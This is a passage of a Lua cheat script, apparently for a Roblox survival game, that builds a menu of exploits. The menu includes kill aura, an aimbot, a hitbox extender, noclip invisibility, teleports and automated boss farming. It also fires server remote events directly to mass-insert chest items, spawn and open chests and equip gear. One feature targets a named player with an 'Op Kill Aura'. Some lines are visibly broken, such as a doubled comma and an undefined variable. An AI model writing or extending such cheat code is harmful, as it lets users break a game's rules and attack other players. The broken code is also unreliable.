                    if string.find(chest.Name:lower(), 'storage') and chest:FindFirstChildOfClass('MeshPart') then
                        if getgenv().configs.ChestType == 'Any' then
                            local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
                            if dist < range then
                                range = dist
                                closest = chest
                            end
                        else
                            if string.find(chest.Name:lower(), getgenv().configs.ChestType:lower()) then
                                local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
                                if dist < range then
                                    range = dist
                                    closest = chest
                                end
                            end
                        end
                    end
                end
            end
	        return closest
        end
        local GetFilteredChest = GetClosestFilteredChest()
        if not GetFilteredChest then
            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
            return
        end
        for i=1, getgenv().AmountOfChestInserts do
            RemoteEvents['UpdateStorageChest']:FireServer(GetFilteredChest, true, SWITCHEDITEMSTABLE[getgenv().ItemToPutInChest])
        end
    end
})

getgenv().ChestItems = AnythingInChestSection:AddDropdown({
    Name = 'Inventory Item',
    DefaultItemSelected = '...',
    Options = {'...'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().ItemToPutInChest = Value 
    end
})

local ItemsToPutInChest = {};

for _, inv in pairs(MyInventory:GetChildren()) do
    if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
        table.insert(ItemsToPutInChest, inv.Name)
    end
end

table.sort(ItemsToPutInChest)

getgenv().ChestItems:Update(ItemsToPutInChest)

if not getgenv().InventoryCollecting then
    getgenv().InventoryCollecting = MyInventory.ChildAdded:Connect(function(item)
        ItemsToPutInChest = {}
		for _, inv in pairs(MyInventory:GetChildren()) do
			if inv:IsA("ImageLabel") and inv.Name ~= 'Arrow' then
				table.insert(ItemsToPutInChest, inv.Name)
			end
		end
        table.sort(ItemsToPutInChest)
        getgenv().ChestItems:Update(ItemsToPutInChest)
    end)
end

MainTab:AddSlider({
    Name = 'Amount of item',
    Min = 1,
	Max = 200,
	Default = 1,
	Digits = 0,
	Callback = function(Value)
		getgenv().AmountOfChestInserts = Value
	end 
})


MainTab:AddToggle({
    Name = 'Auto Eat(Greatest food source)',
    Default = false,
    Callback = function(Value)
        getgenv().configs.AutoEat = Value
        AutoEat()
    end
})
MainTab:AddDropdown({
    Name = 'Auto Eat Type',
    DefaultItemSelected = 'AFK',
    Options = {'AFK', 'War'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().configs.EatingType = Value
    end
})

MainTab:AddToggle({
    Name = 'Ctrl+Click tp',
    Default = false,
	Flag = 'CtrlTp',
    Callback = function(Value)
        getgenv().configs.ClickTp = Value
        ClickTp()
    end
})

MainTab:AddToggle({
    Name = 'Mine Aura',
    Default = false,
	Flag = 'MineAura',
    Callback = function(Value)
        getgenv().configs.MineAura = Value
        MineAura()
    end
})

MainTab:AddButton({
    Name = 'Go invisible(Player noclips)',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.Position
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7195, 98, 18663)
            for _, descendant in pairs(LocalPlayer.Character:GetDescendants()) do
                if descendant:IsA("Motor6D") or descendant.Name == 'PlayerBillboard' then
                    descendant:Destroy()
                end
            end
            task.wait(1)
            if LocalPlayer.Character:FindFirstChild('Hitbox') then
                LocalPlayer.Character.Hitbox:Destroy()
            end
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(oldpos)
        end
    end
})

MainTab:AddButton({
    Name = 'Go Visible(Resets character)',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local Respawn
            local oldpos = LocalPlayer.Character.HumanoidRootPart.Position
            LocalPlayer.Character.Humanoid.Health = 0
            Respawn = LocalPlayer.CharacterAdded:Connect(function(chr)
                chr:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(oldpos)
                Respawn:Disconnect()
                return
            end)
        end
    end
})

MainTab:AddButton({
    Name = 'Render Map(Helpful for loading assets)',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame
            local function MakeTween(pos)
                return TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {CFrame = CFrame.new(pos)})
            end
            local a = MakeTween(Vector3.new(-1812, 46, -7685))
            a:Play()
            a.Completed:Wait()
            local b = MakeTween(Vector3.new(-1838, 46, -3189))
            b:Play()
            b.Completed:Wait()
            local c =  MakeTween(Vector3.new(5825, 76, -3258))
            c:Play()
            c.Completed:Wait()
            local d =  MakeTween(Vector3.new(5330, 36, -7372))
            d:Play()
            d.Completed:Wait()
            local e =  MakeTween(Vector3.new(4782, 74, -5208))
            e:Play()
            e.Completed:Wait()
            local f =  MakeTween(Vector3.new(-152, 106, -4079))
            f:Play()
            f.Completed:Wait()
            LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = oldpos
        end
    end
})

MainTab:AddToggle({
    Name = 'Other Hacker Detector',
    Default = false,
    Callback = function(Value)
        local function CheckTeleport(rootpart, initialpos)
            task.wait(0.2)
            if (rootpart.Position - initialpos).magnitude > 100 then
                return true
            end
        end
        local function CheaterDetector()
            _G.cooldown = 0
            local abs = math.abs
            local Reason = 'Unknown'
            while getgenv().configs.CheaterDetector do
                if getgenv().configs.CheaterDetector then
                    task.wait(_G.cooldown)
                    for _, plr in pairs(Players:GetPlayers()) do
                        if plr ~= LocalPlayer then
                            if IsPlayerAlive(plr) then
                                local oldpos = plr.Character.HumanoidRootPart.Position
                                local velocity = plr.Character.HumanoidRootPart.AssemblyLinearVelocity
                                local maxvelocity = {abs(velocity.X), abs(velocity.Y), abs(velocity.Z)}
                                local max = math.max(unpack(maxvelocity))
                                task.spawn(function()
                                    if CheckTeleport(plr.Character.HumanoidRootPart, plr.Character.HumanoidRootPart.Position) then
                                        Reason = 'Teleporting'
                                        MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    end
                                    _G.cooldown = 0.5
                                end)
                                if plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.PlatformStanding then
                                    Reason = 'Flying'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 3
                                elseif plr.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated and max > 60 then
                                    Reason = 'Vehicle Fly/Speed'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                elseif max > 80 and max ~= maxvelocity[2] then
                                    Reason = 'Excessive Speed'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                elseif plr.Character.Humanoid.WalkSpeed > 24 then
                                    Reason = 'Speed'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                elseif plr.Character.Humanoid.JumpPower > 80 then
                                    Reason = 'Jump Power'
                                    MakeAtlasNotification('Suspicious Activity', plr.Name..' is looking suspicious, Reason: '..Reason, 3)
                                    _G.cooldown = 1
                                end
                            end
                        end
                    end
                end
            end
        end
        getgenv().configs.CheaterDetector = Value
        CheaterDetector()
    end
})

-- Auto Deflectio Toggle
CombatTab:AddToggle({
    Name = 'Auto Deflectio',
    Default = false,
    Flag = 'AutoDeflectio',
    Callback = function(Value)
        getgenv().configs.AutoDeflectio = Value
        if Value then
            spawn(function()
                while getgenv().configs.AutoDeflectio do
                    local inventoryArgs = {
                        [1] = 293,
                        [2] = "Equip"
                    }

                    local magicArgs = {
                        [1] = "SpellSelected",
                        [2] = "Deflectio Projectio"
                    }

                    local toolActionArgs = {
                        [1] = "Deflectio Projectio"
                    }

                    game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction"):FireServer(unpack(inventoryArgs))
                    game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("Magic"):FireServer(unpack(magicArgs))
                    game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("ToolAction"):FireServer(unpack(toolActionArgs))
                    wait(1)
                    game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction"):FireServer(unpack(inventoryArgs))
                    wait(140) -- Wait for 140 seconds before firing again
                end
            end)
        end
    end
})

-- Toggle Obsidian Armor Button
CombatTab:AddToggle({
    Name = 'Toggle Obsidian Armor',
    Default = false,
    Callback = function(Value)
        getgenv().configs.ToggleObsidianArmor = Value

        if Value then
            local equipArgs = {
                {369, "Equip"},
                {235, "Equip"},
                {225, "Equip"},
                {226, "Equip"},
                {227, "Equip"},
                {228, "Equip"}
            }

            for _, args in ipairs(equipArgs) do
                game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction"):FireServer(unpack(args))
                wait(-1)  -- Adjust the wait time between equipping different items
            end
        else
            local unequipArgs = {
                {369, "Equip"},  -- Assuming "Equip" is used for both equipping and unequipping
                {235, "Equip"},
                {225, "Equip"},
                {226, "Equip"},
                {227, "Equip"},
                {228, "Equip"}
            }

            for _, args in ipairs(unequipArgs) do
                game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction"):FireServer(unpack(args))
                wait(-1)  -- Adjust the wait time between unequipping different items
            end
        end
    end
})
-- Toggle Soul Armor Button
CombatTab:AddToggle({
    Name = 'Toggle Soul Armor',
    Default = false,
    Flag = 'ToggleSoulArmor',
    Callback = function(Value)
        getgenv().configs.ToggleSoulArmor = Value

        if Value then
            local equipSoulArmorArgs = {
                {201, "Equip"},  -- Soul Helmet
                {202, "Equip"},  -- Soul Body
                {203, "Equip"},  -- Soul Legs
                {204, "Equip"},  -- Soul Boots
				{369, "Equip"},  --MS Sword
                {235, "Equip"}   -- Ob Shield
            }

            for _, args in ipairs(equipSoulArmorArgs) do
                game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction"):FireServer(unpack(args))
                wait(-1)  -- Adjust the wait time between equipping different items
            end
        else
            local unequipSoulArmorArgs = {
                {201, "Equip"},  -- Assuming "Equip" is used for both equipping and unequipping
                {202, "Equip"},
                {203, "Equip"},
                {204, "Equip"},
				{369, "Equip"},  --MS Sword
                {235, "Equip"}   -- Ob Shield
            }

            for _, args in ipairs(unequipSoulArmorArgs) do
                game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction"):FireServer(unpack(args))
                wait(-1)  -- Adjust the wait time between unequipping different items
            end
        end
    end
})

-- Toggle Moonstone Armor Button
CombatTab:AddToggle({
    Name = 'Toggle Moonstone Armor',
    Default = false,
    Flag = 'ToggleMoonstoneArmor',
    Callback = function(Value)
        getgenv().configs.ToggleMoonstoneArmor = Value

        if Value then
            local equipMoonstoneArmorArgs = {
                {363, "Equip"},  -- Moonstone Helmet
                {364, "Equip"},  -- Moonstone Body
                {365, "Equip"},  -- Moonstone Legs
                {366, "Equip"},  -- Moonstone Boots
				{369, "Equip"},  --MS Sword
                {235, "Equip"}   -- Ob Shield   
            }

            for _, args in ipairs(equipMoonstoneArmorArgs) do
                game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction"):FireServer(unpack(args))
                wait(-1)  -- Adjust the wait time between equipping different items
            end
        else
            local unequipMoonstoneArmorArgs = {
                {363, "Equip"},  -- Assuming "Equip" is used for both equipping and unequipping
                {364, "Equip"},
                {365, "Equip"},
                {366, "Equip"},
				{369, "Equip"},  --MS Sword
                {235, "Equip"}   -- Ob Shield 
            }

            for _, args in ipairs(unequipMoonstoneArmorArgs) do
                game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction"):FireServer(unpack(args))
                wait(-1)  -- Adjust the wait time between unequipping different items
            end
        end
    end
})
CombatTab:AddToggle({
    Name = 'Kill Aura',
    Default = false,
    Flag = 'KillAura',
    Callback = function(Value)
        getgenv().configs.KillAura = Value
        KillAura()
    end
})

CombatTab:AddTextbox({
    Name = 'Whitelist Person',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'WhitelistPersonTextbox',
    Callback = function(args)
        if args == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
                table.insert(Whitelist_table, plr.Name)
                MakeAtlasNotification("Player added to whitelist", plr.Name .. ' was added to the whitelist table', 3)
                return
            end
        end
    end
})

CombatTab:AddTextbox({
    Name = 'Remove Whitelisted Person',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'BlacklistPersonTextbox',
    Callback = function(args)
        if args == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if string.find(plr.Name:lower(), args:lower()) or string.find(plr.DisplayName:lower(), args:lower()) then
                if table.find(Whitelist_table, plr.Name) then
                    table.remove(Whitelist_table, table.find(Whitelist_table, plr.Name))
                    MakeAtlasNotification("Player removed from whitelist", plr.Name .. ' was removed from the whitelist', 3)
                    return
                end
            end
        end
    end
})

local CombatTab = Combat:CreateSection('Close Combat')

CombatTab:AddToggle({
    Name = 'Player Lock(Aimbot)',
    Default = false,
    Flag = 'PlayerLock',
    Callback = function(Value)
        getgenv().configs.PlayerLock = Value
        PlayerLock()
    end
})

CombatTab:AddToggle({
    Name = 'Auto Heal(Pumpkins)',
    Default = false,
    Flag = 'AutoHeal',
    Callback = function(Value)
        getgenv().configs.Pumpkins = Value
        Pumpkins()
    end
})

CombatTab:AddToggle({
    Name = 'Hitbox Extender',
    Default = false,
    Flag = 'HitboxExtender',
    Callback = function(Value)
        getgenv().configs.Hitbox = Value
        Hitbox()
        if not getgenv().configs.Hitbox then
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and plr.Character:FindFirstChild('Hitbox') then
                    plr.Character.Hitbox.Size = Vector3.new(4.9453125, 6.273651123046875, 2.0283203125)
                end
            end
        end
    end
})

CombatTab:AddToggle({
    Name = "Escape Death Toggle",
    Default = false,
    Callback = function(Value)
        getgenv().configs.SafeDeath = Value
        SafeDeath()
    end
})

CombatTab:AddSlider({
    Name = "Escape Death Slider",
    Min = 5,
    Max = 30,
    Default = 15,
    Increment = 1,
    Digits = 0,
    ValueName = "Time",
    Callback = function(Value)
        TimeBetweenTps = Value
    end
})

CombatTab:AddTextbox({
    Name = 'Op KillAura Target',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'OpKillAuraTarget',
    Callback = function(Value)
        if Value == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if string.find(plr.Name:lower(), Value:lower()) or string.find(plr.DisplayName:lower(), Value:lower()) then
                table.insert(OpKillAuraTable, 1, plr)
                MakeAtlasNotification("Entered "..plr.Name, 'You are going to target ' ..plr.Name .. ' >:)', 3)
                return
            end
        end
    end
})

CombatTab:AddToggle({
    Name = "Op Kill Aura(Dont touch slider)",
    Default = false,
    Callback = function(Value)
        getgenv().configs.OpKillAura = Value
        OpKillAura()
    end
})
CombatTab:AddSlider({
    Name = "Op Kill Aura Slider",
    Min = 1,
    Max = 8,
    Default = 3,
    Increment = 1,
    ValueName = "PredictAmount",
    Callback = function(Value)
        getgenv().PredictAmount = Value
    end
})

CombatTab:AddToggle({
    Name = 'Toggle Predict',
    Default = false,
    Flag = 'TogglePredict',
    Callback = function(Value)
        getgenv().configs.PredictOpKillAura = Value
    end
})
CombatTab:AddToggle({
    Name = 'Mob Aura',
    Default = false,
    Flag = 'MobAura',
    Callback = function(Value)
        getgenv().configs.MobAura = Value
        MobAura()
    end
})

CombatTab:AddBind({
    Name = 'Trap Player',
	Default = Enum.KeyCode.Minus,
	Hold = false,,
    KeyPressed = TrapPlayer
})

CombatTab:AddDropdown({
    Name = 'Trap Type',
    DefaultItemSelected = 'Stone Trap',
    Options = {'Stone Trap', 'Ruby Trap', 'Zenyte Trap'},
    ItemSelecting = true,
    Callback = function(Value)
       getgenv().configs.TrapType = Value 
    end
})

local FarmTab = Farming:CreateSection('Tree Farm')

FarmTab:AddToggle({
	Name = 'Conifer Farm(equip any tool)',
	Default = false,
    Flag = 'ConiferFarm',
	Callback = function(Value)
		getgenv().configs.ConfierFarm = Value
		ConiferFarm()
	end
})

local FarmTab = Farming:CreateSection('Boss Farm Settings')

FarmTab:AddToggle({
    Name = 'Auto repair Ob Club(50%)(place chest)',
    Default = false,
    Flag = 'AutoRepairClub',
    Callback = function(Value)
        getgenv().configs.AutoRepairClub = Value
       AutoRepairClub()
    end
})

FarmTab:AddToggle({
    Name = 'Use Soul Keys to farm bosses(inf farm)',
    Default = false,
    Flag = 'SoulKeyBossFarm',
    Callback = function(Value)
        getgenv().configs.UseSoulKeys = Value
    end
})

local FarmTab = Farming:CreateSection('Boss Farms(Disables kill aura)')

FarmTab:AddToggle({
    Name = 'Obsidian Boss Farm',
    Default = false,
    Flag = 'ObsidianBossFarm',
    Callback = function(Value)
        getgenv().configs.ObsidianBoss = Value
       ObsidianBoss()
    end
})

FarmTab:AddToggle({
    Name = 'Zenyte/Lucky Boss Farm',
    Default = false,
    Flag = 'Zenyte/LuckyBoss Farm',
    Callback = function(Value)
        getgenv().configs.ZenLuckBoss = Value
       ZenLuckBoss()
    end
})

FarmTab:AddToggle({
    Name = 'Spirit Boss Aura',
    Default = false,
    Flag = 'SpiritBossFarm',
    Callback = function(Value)
        getgenv().configs.SpiritBoss = Value
       SpiritBoss()
    end
})

local FarmTab = Farming:CreateSection('NOT AUTO')

FarmTab:AddToggle({
    Name = 'Lucky Slime Farm',
    Default = false,
    Flag = 'LuckySlimeFarm',
    Callback = function(Value)
        getgenv().configs.LuckySlime = Value
       LuckySlime()
    end
})

FarmTab:AddToggle({
    Name = 'Evil Skeleton Farm',
    Default = false,
    Flag = 'EvilSkeletonFarm',
    Callback = function(Value)
        getgenv().configs.EvilSkeleton = Value
        EvilSkeleton()
    end
})

FarmTab:AddToggle({
    Name = 'Ogre Farm',
    Default = false,
    Flag = 'OgreFarm',
    Callback = function(Value)
        getgenv().configs.Ogre = Value
       Ogre()
    end
})

FarmTab:AddToggle({
    Name = 'Captain Squid Farm',
    Default = false,
    Flag = 'CaptainSquidFarm',
    Callback = function(Value)
        getgenv().configs.Squid = Value
        Squid()
    end
})
TeleportsTab:AddButton({
    Name = 'Asteroid',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            if Workspace:FindFirstChild('Asteroid', true) then
                local AstPos = Workspace:FindFirstChild('Asteroid', true):GetPivot().Position
                local myroot = LocalPlayer.Character.HumanoidRootPart
                myroot.CFrame = CFrame.new(AstPos + Vector3.new(0, 35, 0))
            else
                MakeAtlasNotification('No Asteroids gangy', 'A sad sad day... I know :(', 3)
            end
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Lucky Slime',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            if Workspace:WaitForChild('Replicators'):FindFirstChild('Both'):FindFirstChild("Lucky Slime") then
                local slime = Workspace.Replicators.Both["Lucky Slime"]
                if slime:FindFirstChild('Humanoid') and slime:FindFirstChild('HumanoidRootPart') then
                    local slimepos = slime.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    myroot.CFrame = CFrame.new(slimpos + Vector3.new(15, 0, 0))
                end
            else
                MakeAtlasNotification('No Lucky Slime gangy', 'A sad sad day... I know :(', 3)
            end
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Mega Candy Rock',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1944.84009, -6.88914394, -3933.60352, -0.775113165, 2.15758467e-10, 0.631822467, 5.72924108e-09, 1, 6.68708688e-09, -0.631822467, 8.80311202e-09, -0.775113165)
        end
    end
})

local TeleportsTab = Teleports:CreateSection('Traders')

TeleportsTab:AddButton({
    Name = 'Resource Trader',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(4288, 43, -4014)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Armor/Weapon Trader',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(427, 12, -3451)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Ocean Trader',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1673, -290, -5659)
        end
    end
})

local TeleportsTab = Teleports:CreateSection('Volcano')

TeleportsTab:AddButton({
    Name = 'Volcano',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(-842, 63, -3603)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Volanic Furnace',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(2614, -454, -5579)
        end
    end
})

local TeleportsTab = Teleports:CreateSection('Caves')

TeleportsTab:AddButton({
    Name = 'Zenyte Boss',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1741, -440, -4536)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Spirit Boss',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1427, -293, -4959)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Caves level 3',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1581, -502, -4649)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Caves level 2',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1559, -347, -4635)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Central Caves',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1532, -192, -4696)
        end
    end
})

local TeleportsTab = Teleports:CreateSection('Islands')

TeleportsTab:AddButton({
    Name = 'Ice Biome',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1961, -2, -3973)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Pet Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(2889, 54, -6465)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Banaenae Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(3400, 13, -4467)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Magic Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(1292, 125, -7234)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Starter Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(-7507, 19, 7496)
        end
    end
})

TeleportsTab:AddButton({
    Name = 'Secret Island',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(7139, 72, 18673)
        end
    end
})
TeleportsTab:AddButton({
    Name = 'Leaderboard Place',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local myroot = LocalPlayer.Character.HumanoidRootPart
            myroot.CFrame = CFrame.new(5313, 4, -5508)
        end
    end
})

ResourcesTab:AddButton({
    Name = 'Ore Finder',
    Callback = function()
        local OrePositionTable = {}
        for _, ore in pairs(Workspace:GetDescendants()) do
            if ore.Name == getgenv().OreType then
                if ore:IsA('Model') and ore.PrimaryPart ~= nil then
                    local orepos = ore.PrimaryPart.Position
                    table.insert(OrePositionTable, orepos)
                    break
                end
            end
        end
        if OrePositionTable[1] == nil then
            MakeAtlasNotification("No "..getgenv().OreType.. ' Gangy', 'There is no '..getgenv().OreType.. ' :(', 3)
        else
            if IsPlayerAlive(LocalPlayer) then
                local myroot = LocalPlayer.Character.HumanoidRootPart
                myroot.CFrame = CFrame.new(OrePositionTable[1] + Vector3.new(0, 5, 0))
            end
        end
    end
})

ResourcesTab:AddDropdown({
    Name = 'Ore Finder',
    DefaultItemSelected = 'Rock',
    Options = {'Lunar Rock', 'Volcanic Rock', 'Zenyte Rock', 'Diamond Rock', 'Gold Rock', 'Ruby Rock', 'Candy Rock', 'Silver Rock', 'Coal Rock', 'Rock'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().OreType = Value 
    end
})

local ResourcesTab = OtherStuff:CreateSection('Pathes, Shells, Slimes Finding')

ResourcesTab:AddButton({
    Name = 'Other Stuff Finder',
    Callback = function()
        local MiscPositionsTable = {}
        for _, misc in pairs(Workspace:GetDescendants()) do
            if misc.Name == getgenv().MiscItems then
                if misc:IsA('Model') and misc.PrimaryPart ~= nil then
                    local miscpos = misc.PrimaryPart.Position
                    table.insert(MiscPositionsTable, miscpos)
                end
            end
        end
        if MiscPositionsTable[1] == nil then
            MakeAtlasNotification("No "..getgenv().MiscItems.. ' Gangy', 'There is no '..getgenv().MiscItems.. ' :(', 3)
        else
            if IsPlayerAlive(LocalPlayer) then
                local myroot = LocalPlayer.Character.HumanoidRootPart
                myroot.CFrame = CFrame.new(MiscPositionsTable[1] + Vector3.new(0, 5, 0))
            end
        end
    end
})

ResourcesTab:AddDropdown({
    Name = 'Item Type',
    DefaultItemSelected = 'Watermelon Patch',
    Options = {'Watermelon Patch', 'Potato Patch', 'Carrot Patch', 'Cabbage Patch', 'Small Oyster', 'Large Orange Shell', 'Large Pink Shell', 'Large White Shell', 'Small Orange Shell', 'Small Pink Shell', 'Small White Shell', 'Seaglass', 'Orange Slime', 'Green Slime', 'Blue Slime',},
    ItemSelecting = true,
    Callback = function(Value)
       getgenv().MiscItems = Value 
    end
})

local TreasureTab = Chests:CreateSection('Chest Spawning')

TreasureTab:AddButton({
    Name = 'Spawn Easy Treaure Chest(100 tokens)',
    Callback = function()
        RemoteEvents['BuyWorldEvent']:FireServer(1)
    end
})

TreasureTab:AddButton({
    Name = 'Spawn Medium Treaure Chest(450 tokens)',
    Callback = function()
        RemoteEvents['BuyWorldEvent']:FireServer(2)
    end
})

TreasureTab:AddButton({
    Name = 'Spawn Hard Treaure Chest(1000 tokens)',
    Callback = function()
        RemoteEvents['BuyWorldEvent']:FireServer(3)
    end
})

local TreasureTab = Chests:CreateSection('Chest Opening')

TreasureTab:AddButton({
    Name = 'Open Easy Chest',
    Callback = function()
        RemoteEvents['InventoryInteraction']:FireServer(166, "Open")
    end
})

TreasureTab:AddButton({
    Name = 'Open Medium Chest',
    Callback = function()
        RemoteEvents['InventoryInteraction']:FireServer(167, "Open")
    end
})

TreasureTab:AddButton({
    Name = 'Open Hard Chest',
    Callback = function()
        RemoteEvents['InventoryInteraction']:FireServer(168, "Open")
    end
})
TreasureTab:AddButton({
    Name = 'Get Map Treaure',
    Callback = function()
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
            local myroot = LocalPlayer.Character.HumanoidRootPart
            local function GetAllTreasure()
                for _, chest in pairs(Workspace:GetDescendants()) do
                    if string.find(chest.Name, 'Treasure Chest') then
                        local chestpos = chest:GetPivot().Position
                        repeat task.wait()
                            if chest.Parent then
                                myroot.CFrame = CFrame.new(chestpos + Vector3.new(0, 1, 0))
                                RemoteEvents['ItemInteracted']:FireServer(chest, "Pickup")
                            end
                        until not chest.Parent
                    end
                end
                myroot.CFrame = oldpos
            end
            if not GetAllTreasure() then
                MakeAtlasNotification('No chests spawned in :(', 'Try spawning one in! or..... wait.', 3)
            end
        end
    end
})

local TreasureTab = Chests:CreateSection('Clue Helper')

TreasureTab:AddButton({
    Name = 'Clue is a text',
    Callback = function()
        local Steps = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Clues'):WaitForChild('Steps'))
        local currentclue = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('Riddle')
        local loadout = currentclue.Parent.Loadout.Text
        local cluetable = {};
        local CLUETYPE = nil;
        local loadoutsubbed = string.gsub(loadout, 'Must wear:  ', '')

        local function TrackClue()
            for _, riddle in pairs(Steps) do
                if riddle.Riddle ~= nil then
